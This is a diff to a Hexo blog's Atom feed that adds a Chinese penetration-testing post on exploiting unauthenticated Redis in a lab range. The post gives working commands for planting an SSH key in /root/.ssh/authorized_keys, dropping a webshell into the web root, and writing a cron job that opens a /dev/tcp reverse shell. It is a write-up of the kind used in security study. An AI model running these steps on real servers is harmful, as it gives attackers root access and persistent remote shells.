@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://fl4g.cn/"/>
-  <updated>2019-01-22T08:55:23.288Z</updated>
+  <updated>2019-02-27T07:51:07.927Z</updated>
   <id>https://fl4g.cn/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Redis未授权访问</title>
+    <link href="https://fl4g.cn/2019/02/27/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>https://fl4g.cn/2019/02/27/Redis未授权访问/</id>
+    <published>2019-02-27T06:24:10.000Z</published>
+    <updated>2019-02-27T07:51:07.927Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>Redis默认配置未配置密码，如果Redis以root用户运行，攻击者可以给root账号写入SSH公钥文件，直接通过SSH免密登录服务器。Redis默认端口为6379端口。若此端口未限制公网访问，会导致Redis服务暴露公网，造成未授权访问。</p><h1 id="0x02-攻击手段"><a href="#0x02-攻击手段" class="headerlink" title="0x02 攻击手段"></a>0x02 攻击手段</h1><h2 id="连接测试"><a href="#连接测试" class="headerlink" title="连接测试"></a>连接测试</h2><p>已知网络靶场IP为219.153.49.228，Redis端 口为47234，提供了http端口为41481。使用redis客户端进行连接尝试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 219.153.49.228 -p 47234</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/连接测试.PNG" alt=""></p><h2 id="本地生成公私钥"><a href="#本地生成公私钥" class="headerlink" title="本地生成公私钥"></a>本地生成公私钥</h2><p>若Redis以root用户运行，可以直接将本地生成的公钥导入到/root/.ssh/authorized.keys文件中实现免密登录。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/生成公私钥.PNG" alt=""></p><h2 id="公钥写入"><a href="#公钥写入" class="headerlink" title="公钥写入"></a>公钥写入</h2><p>由于网络靶场写入/root/.ssh/的权限受限，因此以之前对公司内网测试获取的一台Redis服务器为例。<br>先将公钥写入文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; h.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/公钥写入文件.png" alt=""></p><p>将h.txt的内容写入到redis服务器key为test对应的value中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat h.txt | /usr/redis/./redis-cli -h xxx.xxx.xxx.xxx -p 6389 -x <span class="built_in">set</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/写入value.PNG" alt=""></p><p>设置redis的dbfilename路径为/root/.ssh/authorized_keys，并保存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/27/Redis未授权访问/修改dbfilename.png" alt=""></p><p>直接使用ssh访问服务器查看权限和文件，可见为root权限用户。<br><img src="/2019/02/27/Redis未授权访问/查看权限.png" alt=""></p><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>网络靶场写入/root/.ssh/的权限受限，且存在php站点，因此尝试写入webshell。<br>设置Redis备份目录为php站点目录：/var/www/html/，文件名任意。<br><img src="/2019/02/27/Redis未授权访问/写入webshell.png" alt=""></p><p>使用浏览器访问webshell，可以正常访问。<br><img src="/2019/02/27/Redis未授权访问/连接webshell.png" alt=""></p><h2 id="写入定时任务"><a href="#写入定时任务" class="headerlink" title="写入定时任务"></a>写入定时任务</h2><p>同理，将Redis备份目录改为/var/spool/cron，使用nc进行监听反弹shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip_addr/port 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure></p><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">Redis未授权访问详解</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h1&gt;&lt;p&gt;Redis默认配置未配置密码，如果Redis以root用户运行，攻击者可以给root
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="漏洞" scheme="https://fl4g.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
   
   <entry>
     <title>GSIL配置使用--GitHub敏感信息泄露监控</title>
